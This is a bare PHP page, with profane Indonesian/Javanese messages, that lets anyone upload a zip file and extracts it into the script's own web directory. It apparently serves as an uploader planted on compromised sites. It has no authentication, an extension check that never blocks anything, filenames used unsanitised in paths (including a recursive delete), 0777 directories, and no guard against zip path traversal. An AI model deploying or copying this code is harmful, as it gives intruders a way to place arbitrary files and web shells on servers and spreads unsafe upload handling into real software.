      <?php
    function rmdir_recursive($dir) {
        foreach(scandir($dir) as $file) {
           if ('.' === $file || '..' === $file) continue;
           if (is_dir("$dir/$file")) rmdir_recursive("$dir/$file");
           else unlink("$dir/$file");
       }
     
       rmdir($dir);
    }
     
    if($_FILES["zip_file"]["name"]) {
    	$filename = $_FILES["zip_file"]["name"];
    	$source = $_FILES["zip_file"]["tmp_name"];
    	$type = $_FILES["zip_file"]["type"];
     
    	$name = explode(".", $filename);
    	$accepted_types = array('application/zip', 'application/x-zip-compressed', 'multipart/x-zip', 'application/x-compressed');
    	foreach($accepted_types as $mime_type) {
    		if($mime_type == $type) {
    			$okay = true;
    			break;
    		} 
    	}
     
    	$continue = strtolower($name[1]) == 'zip' ? true : false;
    	if(!$continue) {
    		$message = "Jancok Iki Kusus File Zip Cok Pokoe Kudu File Zip";
    	}
     
      /* PHP current path */
      $path = dirname(__FILE__).'/';  // absolute path to the directory where zipper.php is in
      $filenoext = basename ($filename, '.zip');  // absolute path to the directory where zipper.php is in (lowercase)
      $filenoext = basename ($filenoext, '.ZIP');  // absolute path to the directory where zipper.php is in (when uppercase)
     
      $targetdir = $path . $filenoext; // target directory
      $targetzip = $path . $filename; // target zip file
     
      /* create directory if not exists', otherwise overwrite */
      /* target directory is same as filename without extension */
     
      if (is_dir($targetdir))  rmdir_recursive ( $targetdir);
     
     
      mkdir($targetdir, 0777);
     
     
      /* here it is really happening */
     
    	if(move_uploaded_file($source, $targetzip)) {
    		$zip = new ZipArchive();
    		$x = $zip->open($targetzip);  // open the zip file to extract
    		if ($x === true) {
    			$zip->extractTo($targetdir); // place in the directory with same name  
    			$zip->close();
     
    			unlink($targetzip);
    		}
    		$message = "<font color=lime'>File Zip Mu Berhasil Di Upload</font>";
    	} else {	
    		$message = "<font color=red'>Server Goblok iki G iso Upload Cok</font>";
    	}
    }
     
     
    ?>
    <!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
    <html xmlns="http://www.w3.org/1999/xhtml">
    <body><center>
    <?php if($message) echo "<p>$message</p>"; ?>
    <form enctype="multipart/form-data" method="post" action="">
    <label>Silahkan Masukan File Zip: <input type="file" name="zip_file" /></label>
    <input type="submit" name="submit" value="Upload" />
    </form>
	</center>
    </body>
    </html> 
